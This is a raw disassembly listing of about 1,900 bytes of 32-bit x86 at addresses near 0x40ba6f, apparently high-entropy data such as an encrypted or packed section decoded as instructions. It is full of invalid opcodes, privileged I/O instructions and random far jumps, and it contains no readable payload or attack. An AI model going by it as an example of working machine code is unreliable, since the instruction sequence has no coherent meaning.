  40ba6f:	dec    ebp
  40ba70:	push   ds
  40ba71:	imul   ecx,DWORD PTR cs:[edi+0xe3a81b1],0x6b
  40ba79:	pop    eax
  40ba7a:	cmp    esi,ecx
  40ba7c:	cmp    al,0xa7
  40ba7e:	inc    edx
  40ba7f:	js     0x40ba4c
  40ba81:	test   DWORD PTR [eax+0x1a],ecx
  40ba84:	fiadd  WORD PTR [edi]
  40ba86:	cmp    eax,DWORD PTR [ebx+ecx*2-0x5e78ff97]
  40ba8d:	rol    DWORD PTR [edi+eiz*2],1
  40ba90:	pop    eax
  40ba91:	nop
  40ba92:	xchg   edx,eax
  40ba93:	xchg   edi,eax
  40ba94:	and    DWORD PTR [edx+0x4e],0x78
  40ba98:	loope  0x40baa6
  40ba9a:	jmp    DWORD PTR [eax+0x3e92154b]
  40baa0:	and    bl,al
  40baa2:	aaa    
  40baa3:	ficomp DWORD PTR [ecx]
  40baa5:	mov    eax,ds:0x878c748f
  40baaa:	stos   BYTE PTR es:[edi],al
  40baab:	jge    0x40ba6c
  40baad:	cwde   
  40baae:	ins    BYTE PTR es:[edi],dx
  40baaf:	ins    BYTE PTR es:[edi],dx
  40bab0:	ffreep st(6)
  40bab2:	jmp    0x40baa8
  40bab4:	les    ebp,FWORD PTR [ecx+0x71ad3745]
  40baba:	leave  
  40babb:	(bad)  
  40babc:	xchg   edx,eax
  40babd:	xchg   edx,eax
  40babe:	xor    al,0x98
  40bac0:	int3   
  40bac1:	jns    0x40ba87
  40bac3:	pushf  
  40bac4:	jge    0x40bb17
  40bac6:	lds    ebp,FWORD PTR [edi+0xd]
  40bac9:	pop    edx
  40bacb:	cdq    
  40bacc:	pminub mm4,QWORD PTR [esi-0x7d]
  40bad0:	pop    edi
  40bad1:	add    edi,DWORD PTR [edi+ebp*1-0x29]
  40bad5:	popa   
  40bad6:	pop    esi
  40bad7:	out    dx,eax
  40bad8:	cmc    
  40bad9:	dec    edx
  40bada:	pop    edx
  40badb:	sbb    DWORD PTR [ebp+0x6],ebx
  40bade:	jbe    0x40baf1
  40bae0:	pop    esp
  40bae1:	retf   
  40bae2:	rol    DWORD PTR [ecx-0x74b17c1f],cl
  40bae8:	push   ebx
  40bae9:	cmp    esi,DWORD PTR [ebx+0x2acc3925]
  40baef:	inc    ebx
  40baf0:	jg     0x40bad4
  40baf2:	inc    edx
  40baf3:	dec    edi
  40baf4:	or     al,0x1
  40baf6:	and    DWORD PTR [ebp-0x4d],esp
  40baf9:	retf   
  40bafa:	add    DWORD PTR [esi+edi*2],ebx
  40bafd:	imul   edi,DWORD PTR [ecx-0x1fce7da0],0x62
  40bb04:	arpl   WORD PTR [eax+0x16b3079f],sp
  40bb0a:	dec    esi
  40bb0b:	xor    al,0xe0
  40bb0d:	scas   eax,DWORD PTR es:[edi]
  40bb0e:	int    0xc0
  40bb10:	pop    ebx
  40bb11:	xor    al,0xb8
  40bb13:	arpl   WORD PTR [eax],bp
  40bb15:	idiv   DWORD PTR [esi]
  40bb17:	fild   WORD PTR [ebx+0x61a5fda8]
  40bb1d:	enter  0x6b4d,0xee
  40bb21:	test   DWORD PTR [edi],esp
  40bb23:	sub    DWORD PTR [ebx+ebp*1-0x46],edi
  40bb27:	fistp  DWORD PTR [ebx]
  40bb29:	sub    al,0x6e
  40bb2b:	adc    dl,al
  40bb2d:	jb     0x40baca
  40bb2f:	xor    BYTE PTR [eax+0x70038e66],dh
  40bb35:	cdq    
  40bb36:	retf   0x5baf
  40bb39:	pop    ds
  40bb3a:	cwde   
  40bb3b:	ficomp WORD PTR [edx+edi*1+0x686a2386]
  40bb42:	mov    edx,0x8384f6fc
  40bb47:	dec    BYTE PTR [esp+edx*4-0x59a9894a]
  40bb4e:	and    DWORD PTR [ebp+0x6b],ecx
  40bb51:	aaa    
  40bb52:	sbb    DWORD PTR [eax+0x42],ecx
  40bb55:	cld    
  40bb56:	test   eax,0xf0c9bc9e
  40bb5b:	sbb    WORD PTR [ebp+0x52],bx
  40bb5f:	xchg   ebx,eax
  40bb60:	jmp    0xafdf:0x5398522
  40bb67:	xchg   edx,eax
  40bb68:	mov    gs:0xd98cd3bc,eax
  40bb6e:	sub    eax,0x9f584e05
  40bb73:	pop    es
  40bb74:	or     bh,dl
  40bb76:	inc    ebx
  40bb77:	sti    
  40bb78:	imul   ebp,DWORD PTR es:[edx-0x17],0xffffffc1
  40bb7d:	or     DWORD PTR [esi+edi*1+0x2c],esp
  40bb81:	mov    ?,ebp
  40bb83:	dec    ebx
  40bb84:	pushf  
  40bb85:	cmp    ebx,DWORD PTR [esi+ebx*2]
  40bb88:	mov    edi,0xfb9299bc
  40bb8d:	mov    esi,es
  40bb8f:	jno    0x40bbdf
  40bb91:	fmul   st(4),st
  40bb93:	enter  0x6105,0x7d
  40bb97:	das    
  40bb98:	push   esi
  40bb99:	jg     0x40bc07
  40bb9b:	ins    DWORD PTR es:[edi],dx
  40bb9c:	or     al,0x20
  40bb9e:	dec    ebx
  40bb9f:	stos   BYTE PTR es:[edi],al
  40bba0:	add    DWORD PTR [edx],ecx
  40bba2:	scas   eax,DWORD PTR es:[edi]
  40bba3:	push   ss
  40bba4:	leave  
  40bba5:	aam    0xe7
  40bba7:	arpl   WORD PTR [edx-0x8f6f214],cx
  40bbad:	inc    ebx
  40bbae:	fadd   DWORD PTR [ebp+0x18d06f17]
  40bbb4:	jne    0x40bbaa
  40bbb6:	sub    cl,BYTE PTR [ebp-0x7a]
  40bbb9:	arpl   WORD PTR [ebx+0x48834e38],sp
  40bbbf:	jl     0x40bb52
  40bbc1:	adc    eax,0x3a647e0
  40bbc6:	rol    DWORD PTR [edx-0x7b],0x23
  40bbca:	push   ecx
  40bbcb:	stos   BYTE PTR es:[edi],al
  40bbcc:	mov    WORD PTR [edx+edx*1+0x7],gs
  40bbd0:	mov    WORD PTR [edx+0x4d],ss
  40bbd3:	xor    eax,0x7e488a85
  40bbd8:	sahf   
  40bbd9:	jo     0x40bb8b
  40bbdb:	je     0x40bc5a
  40bbdd:	inc    edx
  40bbde:	push   ss
  40bbdf:	sub    al,0xb2
  40bbe1:	mov    BYTE PTR [ebx-0x3d],dl
  40bbe4:	dec    esp
  40bbe5:	ss stc 
  40bbe7:	aam    0x9c
  40bbe9:	jp     0x40bb9e
  40bbeb:	inc    eax
  40bbec:	jmp    0x40bc04
  40bbee:	dec    esp
  40bbef:	out    0xd6,eax
  40bbf1:	test   al,0xec
  40bbf3:	or     eax,DWORD PTR [esi-0x65209c23]
  40bbf9:	xchg   edi,eax
  40bbfa:	add    eax,0xc8112fa1
  40bbff:	ds dec edi
  40bc01:	in     eax,0x12
  40bc03:	sub    eax,0xaf8c2fa
  40bc08:	or     dh,BYTE PTR [ecx+0x1c]
  40bc0b:	pop    esp
  40bc0c:	test   esi,0x5a79097d
  40bc12:	mov    edi,0x4c404410
  40bc17:	(bad)  
  40bc18:	enter  0x1bc,0x35
  40bc1c:	(bad)  
  40bc1d:	lea    eax,[eax+0x5c]
  40bc20:	repz pop ecx
  40bc22:	push   ds
  40bc23:	xchg   ebp,eax
  40bc24:	mov    DWORD PTR [esi],ecx
  40bc26:	jle    0x40bbcf
  40bc28:	dec    esi
  40bc29:	adc    ebx,eax
  40bc2b:	xor    BYTE PTR [ebx-0x6f],bl
  40bc2e:	push   edx
  40bc2f:	sub    al,0xd6
  40bc31:	push   ecx
  40bc32:	jg     0x40bc3c
  40bc34:	mov    ah,0xe0
  40bc36:	pop    ds
  40bc37:	jl     0x40bc0e
  40bc39:	fild   WORD PTR [ebx]
  40bc3b:	sahf   
  40bc3c:	ror    DWORD PTR [esi-0x50d23d77],cl
  40bc42:	xor    ecx,ebp
  40bc44:	shl    BYTE PTR [ebp-0x30],1
  40bc47:	retf   
  40bc48:	xor    DWORD PTR [esp+esi*8],0x590b56f1
  40bc4f:	outs   dx,DWORD PTR ds:[esi]
  40bc50:	das    
  40bc51:	fadd   st,st(7)
  40bc53:	jge    0x40bbd8
  40bc55:	(bad)  
  40bc56:	fdiv   DWORD PTR [edx-0x10f0f82]
  40bc5c:	jp     0x40bc18
  40bc5e:	jnp    0x40bcc7
  40bc60:	daa    
  40bc61:	inc    ecx
  40bc62:	pusha  
  40bc63:	mov    ds:0x1eb0cacd,al
  40bc69:	rol    BYTE PTR [ecx+0x4a],1
  40bc6c:	adc    eax,0xf24c5d0e
  40bc71:	in     al,0x46
  40bc73:	sub    eax,0x2cd683cd
  40bc78:	pop    edi
  40bc79:	pop    ss
  40bc7a:	pop    edx
  40bc7b:	dec    edx
  40bc7c:	jmp    0x40bca1
  40bc7e:	cs push edi
  40bc80:	popa   
  40bc81:	es test eax,0xff39502d
  40bc87:	in     al,dx
  40bc88:	in     eax,dx
  40bc89:	adc    DWORD PTR [ecx],ebp
  40bc8b:	sbb    BYTE PTR [edx-0x7e],bl
  40bc8e:	das    
  40bc8f:	fucom  st(6)
  40bc91:	sahf   
  40bc92:	ret    0xff81
  40bc95:	std    
  40bc96:	dec    ebx
  40bc97:	sar    ah,0xf2
  40bc9a:	lods   eax,DWORD PTR ds:[esi]
  40bc9b:	sbb    al,bh
  40bc9d:	shl    BYTE PTR [eax+0x1d],0x9e
  40bca1:	push   0xffffffd6
  40bca3:	addr16 call 0x172b:0xdfd73fad
  40bcab:	mov    BYTE PTR [edx],bh
  40bcad:	add    ebp,DWORD PTR [eax-0x4d1c9cea]
  40bcb3:	jp     0x40bceb
  40bcb5:	(bad)
  40bcb9:	xlat   BYTE PTR ds:[ebx]
  40bcba:	data16 jge 0x40bc44
  40bcbd:	(bad)  
  40bcbe:	in     al,0x7b
  40bcc0:	xchg   BYTE PTR [esi-0x58],bl
  40bcc3:	jns    0x40bd10
  40bcc5:	sar    DWORD PTR [esi+0x33bcbec9],1
  40bccb:	fwait
  40bccc:	xor    ch,BYTE PTR [esi]
  40bcce:	pop    ecx
  40bccf:	aam    0x5f
  40bcd1:	test   BYTE PTR [eax],bh
  40bcd3:	mov    ch,BYTE PTR [eax+edi*8-0x7e8669df]
  40bcda:	arpl   sp,ax
  40bcdc:	stos   BYTE PTR es:[edi],al
  40bcdd:	repz hlt 
  40bcdf:	xchg   DWORD PTR [esi+0xb],esi
  40bce2:	push   esi
  40bce3:	and    dh,BYTE PTR [ecx-0x7861db33]
  40bce9:	ins    BYTE PTR es:[edi],dx
  40bcea:	or     edi,eax
  40bcec:	nop
  40bced:	dec    ecx
  40bcee:	aaa    
  40bcef:	mov    eax,ebx
  40bcf1:	loopne 0x40bca7
  40bcf3:	and    eax,0xe7ecd184
  40bcf8:	fst    QWORD PTR [esi]
  40bcfa:	mov    BYTE PTR [ebp-0x35710deb],al
  40bd00:	repz mov al,0x5e
  40bd03:	or     al,0xf3
  40bd05:	jbe    0x40bd11
  40bd07:	or     eax,0x29d53f14
  40bd0c:	mov    bh,BYTE PTR [edi]
  40bd0e:	arpl   WORD PTR [ecx-0x568cfcf6],bx
  40bd14:	push   ecx
  40bd15:	retf   
  40bd16:	jmp    DWORD PTR [ebp+0x5b]
  40bd19:	sub    al,0x46
  40bd1b:	add    eax,0x41ba4426
  40bd20:	lods   al,BYTE PTR ds:[esi]
  40bd21:	std    
  40bd22:	hlt    
  40bd23:	mov    ds:0xa8501e12,eax
  40bd28:	popa   
  40bd29:	clc    
  40bd2a:	repnz rcr BYTE PTR [ebx-0x18e61eb4],cl
  40bd31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd32:	jo     0x40bce3
  40bd34:	jne    0x40bce1
  40bd36:	cmc    
  40bd37:	fsub   QWORD PTR [edx]
  40bd39:	push   edi
  40bd3a:	jg     0x40bccc
  40bd3c:	aas    
  40bd3d:	mov    esp,0x67b5be74
  40bd42:	sub    eax,0xcce5a6a8
  40bd47:	ficom  WORD PTR cs:[eax-0x23]
  40bd4b:	mov    edi,0x98ce300e
  40bd50:	adc    BYTE PTR [esi+0x1b],al
  40bd53:	push   edx
  40bd54:	outs   dx,BYTE PTR ds:[esi]
  40bd55:	jmp    0x40bd8a
  40bd57:	sbb    eax,0x42b7d8ab
  40bd5c:	adc    bh,BYTE PTR [ebx-0x20]
  40bd5f:	imul   edx,ebp,0x92ec1eae
  40bd65:	daa    
  40bd66:	and    edx,DWORD PTR [edx]
  40bd68:	adc    ch,BYTE PTR [ebx-0x2a4a2bcd]
  40bd6e:	(bad)  
  40bd6f:	and    DWORD PTR [ecx],ebp
  40bd71:	sub    bl,al
  40bd73:	clc    
  40bd74:	push   ss
  40bd75:	xor    bh,BYTE PTR [ebx-0x59669c54]
  40bd7b:	sahf   
  40bd7c:	cld    
  40bd7d:	test   al,0xf
  40bd7f:	test   BYTE PTR [ecx+0x524858b5],ah
  40bd85:	jb     0x40bdc4
  40bd87:	sti    
  40bd88:	ret    
  40bd89:	lock scas al,BYTE PTR es:[edi]
  40bd8b:	xrstor [esi-0x2b]
  40bd8f:	mov    eax,ds:0xac52ea26
  40bd94:	cld    
  40bd95:	fldenv [ebp+0x6284b709]
  40bd9b:	aam    0x8b
  40bd9d:	and    bh,BYTE PTR [edi+0x14]
  40bda0:	in     eax,dx
  40bda1:	addr16 je 0x40bdd5
  40bda4:	add    BYTE PTR [ebx],dl
  40bda6:	adc    BYTE PTR [edx+0x643a00d9],0xbb
  40bdad:	mov    dl,0xc3
  40bdaf:	ins    DWORD PTR es:[edi],dx
  40bdb0:	pop    edi
  40bdb1:	stos   DWORD PTR es:[edi],eax
  40bdb2:	or     esp,ebp
  40bdb4:	mov    ds:0xc83db9ed,eax
  40bdb9:	mov    bl,0x68
  40bdbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bdbc:	jp     0x40be00
  40bdbe:	pop    ss
  40bdbf:	test   BYTE PTR ds:0x32dc3f82,bl
  40bdc5:	mov    al,ds:0x939cac4
  40bdca:	retf   0xccb0
  40bdcd:	add    DWORD PTR [edx],edx
  40bdcf:	stos   DWORD PTR es:[edi],eax
  40bdd0:	jmp    0xa2e2:0x71c1b2d1
  40bdd7:	pushf  
  40bdd8:	jne    0x40bdc7
  40bdda:	xor    esp,DWORD PTR [ebx]
  40bddc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bddd:	int    0xa0
  40bddf:	push   ss
  40bde0:	shl    DWORD PTR [ecx-0x70],1
  40bde3:	pop    eax
  40bde4:	out    0x48,eax
  40bde6:	xchg   DWORD PTR [ecx-0x77],ebx
  40bde9:	in     al,dx
  40bdea:	test   al,0x97
  40bdec:	mov    dh,0x38
  40bdee:	jno    0x40bde5
  40bdf0:	add    ecx,ecx
  40bdf2:	mov    al,0x25
  40bdf4:	mov    cl,BYTE PTR [ebp+0x6f]
  40bdf7:	mov    ebx,0x66fd252f
  40bdfc:	fdivr  QWORD PTR [ecx-0x26121787]
  40be02:	aaa    
  40be03:	inc    ebx
  40be04:	mov    ebx,0xa01daa38
  40be09:	add    dh,BYTE PTR [ecx]
  40be0b:	inc    esp
  40be0c:	(bad)  
  40be0d:	loopne 0x40bdf5
  40be0f:	cmp    al,BYTE PTR [ebx]
  40be11:	mov    ebx,0x98cfe58
  40be16:	into   
  40be17:	or     esi,ecx
  40be19:	ret    
  40be1a:	jno    0x40bdb0
  40be1c:	inc    esi
  40be1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be1e:	add    DWORD PTR [ebx+0x4245ac44],esp
  40be24:	inc    edx
  40be25:	mov    esp,0xa9a718ce
  40be2a:	pushf  
  40be2b:	xor    bh,BYTE PTR [edx+0x6767d9]
  40be31:	ja     0x40be70
  40be33:	daa    
  40be34:	(bad)  
  40be35:	jb     0x40bdf0
  40be37:	(bad)  
  40be38:	inc    BYTE PTR [esi+0x1a]
  40be3b:	rcr    BYTE PTR [esp+edx*8],cl
  40be3e:	mov    eax,ds:0x718ffa07
  40be43:	push   ebx
  40be44:	in     al,0xce
  40be46:	cdq    
  40be47:	pop    ebx
  40be48:	ja     0x40beb1
  40be4a:	pop    ecx
  40be4b:	stos   BYTE PTR es:[edi],al
  40be4c:	sub    ch,BYTE PTR [ebp-0x106faed9]
  40be52:	xchg   BYTE PTR ds:0x7e66f557,ch
  40be58:	pop    esp
  40be59:	and    ebx,edx
  40be5b:	fstp   TBYTE PTR [esi-0x36ee7a37]
  40be61:	mov    al,ds:0xb62a6879
  40be66:	icebp  
  40be67:	and    eax,0x9df27cd8
  40be6c:	cwde   
  40be6d:	mov    ds:0x40be0064,al
  40be72:	push   ebx
  40be73:	clc    
  40be74:	imul   edx,DWORD PTR [eax+0x1df1dfe],0x116aabbd
  40be7e:	xor    al,0xe8
  40be80:	push   es
  40be81:	inc    esp
  40be82:	retf   
  40be83:	mov    DWORD PTR [edx-0x6c19c28c],eax
  40be89:	jge    0x40be29
  40be8b:	adc    DWORD PTR [ecx],0x32a975cd
  40be91:	cmp    DWORD PTR [eax+eiz*8],eax
  40be94:	or     eax,0x67aa6f1
  40be99:	test   BYTE PTR [ecx],ch
  40be9b:	(bad)  
  40be9c:	clc    
  40be9d:	mov    eax,0x3b06d577
  40bea2:	mov    eax,ds:0x49c2a2ac
  40bea7:	cmp    eax,0x5b3cbee5
  40beac:	mov    dl,0x19
  40beae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40beaf:	jae    0x40be70
  40beb1:	inc    esi
  40beb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40beb3:	shl    edx,0x7a
  40beb6:	(bad)  
  40beb8:	in     al,0x9d
  40beba:	repz or dh,BYTE PTR [esi-0x41bd350e]
  40bec1:	jbe    0x40bede
  40bec3:	push   cs
  40bec4:	mov    ecx,0xa8616764
  40bec9:	std    
  40beca:	call   0x7cc66db6
  40becf:	mov    ch,0x1b
  40bed1:	push   edx
  40bed2:	je     0x40bf0d
  40bed4:	xor    al,0x1e
  40bed6:	test   DWORD PTR [edi-0x65],ebp
  40bed9:	sub    esp,DWORD PTR [esi-0x4ba1b6b2]
  40bedf:	ror    DWORD PTR [ebp+0x39],1
  40bee2:	outs   dx,BYTE PTR ds:[esi]
  40bee3:	outs   dx,BYTE PTR ds:[esi]
  40bee4:	cli    
  40bee5:	retf   0xcbcd
  40bee8:	sub    dl,BYTE PTR [esi+0x61]
  40beeb:	mov    cl,BYTE PTR [ecx+0x2b79afe9]
  40bef1:	imul   esi,DWORD PTR [edi],0x1f5a6bab
  40bef7:	ror    DWORD PTR [ebp+0x5],cl
  40befa:	aas    
  40befb:	dec    ebp
  40befc:	fdiv   st,st(6)
  40befe:	mov    eax,ds:0x26da5c3c
  40bf03:	mov    eax,ds:0x8defc30c
  40bf08:	sub    al,0x3d
  40bf0a:	call   FWORD PTR ds:0xb33cd7b2
  40bf10:	test   eax,0x892426c4
  40bf15:	dec    esi
  40bf16:	inc    esi
  40bf17:	sbb    eax,0x54ecc4c2
  40bf1c:	and    DWORD PTR [ebp+0x54e89e0b],edi
  40bf22:	rcl    BYTE PTR [ecx+eiz*1+0x21679bcf],1
  40bf29:	lock repz or cl,BYTE PTR [ecx+0x3f]
  40bf2e:	mov    BYTE PTR [ecx-0x7e],bh
  40bf31:	lods   al,BYTE PTR ds:[esi]
  40bf32:	aas    
  40bf33:	in     al,dx
  40bf34:	mov    edi,0x84bd0955
  40bf39:	xor    al,0xad
  40bf3b:	sub    ah,ah
  40bf3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf3e:	jo     0x40bfa5
  40bf40:	sub    ch,BYTE PTR [edx-0x3b]
  40bf43:	test   eax,0xe5b601b9
  40bf48:	push   esp
  40bf49:	and    al,0x9a
  40bf4b:	xchg   edx,eax
  40bf4c:	hlt    
  40bf4d:	fwait
  40bf4e:	loope  0x40bf48
  40bf50:	test   BYTE PTR [esi-0x49],dl
  40bf53:	fisttp QWORD PTR [edi+0x39f93fe9]
  40bf59:	popa   
  40bf5a:	jge    0x40bf14
  40bf5c:	dec    ebp
  40bf5d:	mov    ds,WORD PTR cs:[esi+eiz*8]
  40bf61:	xor    eax,0x46dc997a
  40bf66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf67:	mov    bh,0xe
  40bf69:	test   BYTE PTR [eax+edx*8+0x6501c01d],dh
  40bf70:	or     BYTE PTR [ebx+0x2e],dl
  40bf73:	daa    
  40bf74:	in     eax,dx
  40bf75:	xor    DWORD PTR [ebx],ecx
  40bf77:	in     al,0x8f
  40bf79:	dec    edi
  40bf7a:	mov    esi,0xf6b192a6
  40bf7f:	cmp    al,BYTE PTR [ebp+0x4]
  40bf82:	push   ss
  40bf83:	push   esi
  40bf84:	out    dx,al
  40bf85:	ins    WORD PTR es:[edi],dx
  40bf87:	jne    0x40bf1a
  40bf89:	mov    ch,0x3e
  40bf8b:	mov    eax,0x2f6d5a8c
  40bf90:	arpl   cx,cx
  40bf92:	fwait
  40bf93:	push   ss
  40bf94:	cmp    cl,BYTE PTR [ebx-0xb]
  40bf97:	dec    ecx
  40bf98:	and    ch,ch
  40bf9a:	aaa    
  40bf9b:	jne    0x40bfb0
  40bf9d:	jo     0x40bff7
  40bf9f:	mov    ah,0xde
  40bfa1:	dec    BYTE PTR [edi]
  40bfa3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bfa4:	(bad)  
  40bfa5:	xchg   ecx,eax
  40bfa6:	xchg   esi,eax
  40bfa7:	jl     0x40bf92
  40bfa9:	hlt    
  40bfaa:	adc    BYTE PTR [ebx],ah
  40bfac:	add    BYTE PTR [edi],0xca
  40bfaf:	or     ch,BYTE PTR [edi+eiz*8+0x7d]
  40bfb3:	fwait
  40bfb4:	push   0xa53c65a9
  40bfb9:	jno    0x40bf49
  40bfbb:	jecxz  0x40bfb4
  40bfbd:	push   es
  40bfbe:	mov    edi,0x5b439a3a
  40bfc3:	xchg   edi,eax
  40bfc4:	sub    BYTE PTR [esi-0x613ea642],dl
  40bfca:	sbb    cl,al
  40bfcc:	loope  0x40c045
  40bfce:	rcr    DWORD PTR [edx],1
  40bfd0:	push   esi
  40bfd1:	in     al,dx
  40bfd2:	fdiv   QWORD PTR [ebx+0x41]
  40bfd5:	mov    ds:0xbb5cc894,al
  40bfda:	fdivr  st(1),st
  40bfdc:	push   0x9973ac7d
  40bfe1:	add    BYTE PTR [ecx-0x6caad86e],bl
  40bfe7:	pop    esi
  40bfe8:	lahf   
  40bfe9:	mov    ds:0xab963254,eax
  40bfee:	inc    eax
  40bfef:	lods   eax,DWORD PTR ds:[esi]
  40bff0:	and    al,0xc6
  40bff2:	cmp    ebx,DWORD PTR cs:[edi]
  40bff5:	or     ah,BYTE PTR [esi]
  40bff7:	stos   DWORD PTR es:[edi],eax
  40bff8:	push   edx
  40bff9:	pop    ds
  40bffa:	out    0x4e,al
  40bffc:	loope  0x40bfca
  40bffe:	sub    dh,BYTE PTR [edi+ebp*4+0x10f5a470]
  40c005:	jg     0x40c02f
  40c007:	adc    ch,BYTE PTR [esi-0x487927e]
  40c00d:	mov    edi,0xece73082
  40c012:	bound  edi,QWORD PTR [eax]
  40c014:	leave  
  40c015:	push   ecx
  40c016:	mov    bl,0xc1
  40c018:	ss inc esi
  40c01a:	xlat   BYTE PTR ds:[ebx]
  40c01b:	cmp    eax,0x8aae5b2d
  40c020:	shr    BYTE PTR [edi],1
  40c022:	imul   ecx,esp,0x878920da
  40c028:	stos   BYTE PTR es:[edi],al
  40c029:	xlat   BYTE PTR ds:[ebx]
  40c02a:	sbb    DWORD PTR [ebx+0x424b7dc0],0x59
  40c031:	in     eax,0x95
  40c033:	jmp    0x187c37cc
  40c038:	mov    ah,0xe2
  40c03a:	dec    edx
  40c03b:	mov    eax,0x38981177
  40c040:	and    edi,esp
  40c042:	jle    0x40c062
  40c044:	xchg   edi,eax
  40c045:	popf   
  40c046:	xchg   DWORD PTR [edi+0x46285155],esi
  40c04c:	sub    ebp,DWORD PTR [eax]
  40c04e:	(bad)  
  40c04f:	ret    0xb828
  40c052:	fld    DWORD PTR [edx+ecx*2-0x102a03d]
  40c059:	outs   dx,DWORD PTR ds:[esi]
  40c05a:	fcmovnu st,st(1)
  40c05c:	cwde   
  40c05d:	in     al,dx
  40c05e:	xor    eax,esi
  40c060:	add    DWORD PTR [esi+eiz*4],0x44
  40c064:	or     eax,0x238348a5
  40c069:	sbb    ch,0xda
  40c06c:	or     eax,0x43754981
  40c071:	dec    eax
  40c072:	out    0x83,eax
  40c074:	sbb    ch,ch
  40c076:	inc    eax
  40c077:	cmp    eax,DWORD PTR [ebx-0x5523bea4]
  40c07d:	(bad)  
  40c07f:	sub    eax,0x45bd74d1
  40c084:	ja     0x40c0ab
  40c086:	and    BYTE PTR [esi],ch
  40c088:	pop    ds
  40c089:	fnstenv [edx-0x26]
  40c08c:	mov    al,0xe6
  40c08e:	lahf   
  40c08f:	push   edx
  40c090:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c091:	dec    esi
  40c092:	daa    
  40c093:	in     al,dx
  40c094:	fbld   TBYTE PTR [esi+0x132dec68]
  40c09a:	cmp    al,0x64
  40c09c:	lahf   
  40c09d:	mov    ?,WORD PTR [eax]
  40c09f:	lock cmp BYTE PTR [ebx+0x60],dh
  40c0a3:	add    al,BYTE PTR [eax+0x8729bc5]
  40c0a9:	push   esp
  40c0aa:	jmp    DWORD PTR [ebp+0x7c]
  40c0ad:	add    al,0xe4
  40c0af:	add    dl,BYTE PTR [edx-0x66]
  40c0b2:	fidiv  DWORD PTR [eax+0x1a]
  40c0b5:	imul   BYTE PTR [ecx-0x7f781d9c]
  40c0bb:	mov    bl,0x4e
  40c0bd:	xor    al,0x36
  40c0bf:	dec    BYTE PTR [edx]
  40c0c1:	mov    dh,0x19
  40c0c3:	imul   eax,eax,0x3
  40c0c6:	scas   eax,DWORD PTR es:[edi]
  40c0c7:	in     eax,dx
  40c0c8:	int    0xb0
  40c0ca:	and    al,0x38
  40c0cc:	dec    eax
  40c0cd:	fs push ss
  40c0cf:	mov    ebp,0xde232769
  40c0d4:	nop
  40c0d5:	outs   dx,DWORD PTR ds:[esi]
  40c0d6:	sahf   
  40c0d7:	inc    ebx
  40c0d8:	and    al,0xb
  40c0da:	or     BYTE PTR [eax+0x50],bh
  40c0dd:	or     ebp,DWORD PTR [edi+0x4a]
  40c0e0:	jl     0x40c12d
  40c0e2:	lds    ebp,FWORD PTR [eax+0x9287556]
  40c0e8:	xchg   DWORD PTR [edi+0x43f3ce5d],esp
  40c0ee:	add    al,0x34
  40c0f0:	dec    ebp
  40c0f1:	loop   0x40c092
  40c0f3:	jbe    0x40c094
  40c0f5:	outs   dx,BYTE PTR ds:[esi]
  40c0f6:	add    esi,ebp
  40c0f8:	in     eax,0xb6
  40c0fa:	cli    
  40c0fb:	jge    0x40c102
  40c0fd:	mov    esp,esp
  40c0ff:	cwde   
  40c100:	dec    ebx
  40c101:	imul   esi,edi,0x5a
  40c104:	mov    ebx,ebp
  40c106:	xlat   BYTE PTR ds:[ebx]
  40c107:	jmp    0x6fc8:0x875dd1
  40c10e:	addr16 ss jnp 0x40c167
  40c112:	lock adc DWORD PTR [ebx+0x133add9d],eax
  40c119:	mov    ds:0xbabe35a,eax
  40c11e:	sti    
  40c11f:	add    eax,0xe1f4aa20
  40c124:	cmp    BYTE PTR [ebx],0x22
  40c127:	(bad)  [ebx-0x41f7337f]
  40c12d:	mov    al,0x41
  40c12f:	in     al,0x73
  40c131:	loope  0x40c16e
  40c133:	sub    al,0x40
  40c135:	neg    DWORD PTR [eax+0x62d7be52]
  40c13b:	pop    ebp
  40c13c:	push   ebp
  40c13d:	mov    ch,0x9f
  40c13f:	xchg   ebp,eax
  40c140:	cwde   
  40c141:	xchg   esp,eax
  40c142:	cmp    BYTE PTR [edi-0x53dfe32e],dh
  40c148:	dec    ebx
  40c149:	imul   edi,esp,0x79
  40c14c:	push   es
  40c14d:	cmp    al,cl
  40c14f:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c151:	pop    ecx
  40c152:	mov    BYTE PTR [edi-0x53],bh
  40c155:	sbb    eax,0x12e452d0
  40c15a:	mov    cl,0x99
  40c15c:	ror    edi,cl
  40c15e:	mov    BYTE PTR ds:0x97b553dc,bl
  40c164:	js     0x40c129
  40c166:	clc    
  40c167:	aam    0xc6
  40c169:	mov    ds:0x5b7f4adf,eax
  40c16e:	ret    
  40c16f:	ret    
  40c170:	shl    DWORD PTR [esi+0x14],cl
  40c173:	sbb    al,0x90
  40c175:	mov    dh,0x11
  40c177:	fcmove st,st(7)
  40c179:	mov    edi,0x1b650f81
  40c17e:	or     eax,0xf94d7049
  40c183:	fidivr WORD PTR [esi]
  40c185:	jbe    0x40c1b1
  40c187:	dec    ecx
  40c188:	xor    bl,BYTE PTR [edi]
  40c18a:	add    eax,ebx
  40c18c:	sbb    edi,DWORD PTR [ebp-0x1bd0ab12]
  40c192:	inc    ebp
  40c193:	popa   
  40c194:	sub    al,0xf3
  40c196:	inc    ecx
  40c197:	aaa    
  40c198:	mov    WORD PTR [ecx+0x8317095],gs
  40c19e:	push   edi
  40c19f:	dec    esi
  40c1a1:	xor    BYTE PTR [ebx],bl
  40c1a3:	popf   
  40c1a4:	hlt    
  40c1a5:	add    eax,DWORD PTR [ebp+0x6d]
  40c1a8:	xchg   edx,eax
  40c1a9:	das    
  40c1aa:	scas   al,BYTE PTR es:[edi]
  40c1ab:	idiv   BYTE PTR cs:0x7a078365
  40c1b2:	xchg   ebp,eax
  40c1b3:	mov    BYTE PTR [esi],cl
  40c1b5:	mov    eax,0x17613416
  40c1ba:	and    eax,0x3985bcc3
  40c1bf:	scas   eax,DWORD PTR es:[edi]
  40c1c0:	and    ebp,DWORD PTR [ecx]
  40c1c2:	pop    es
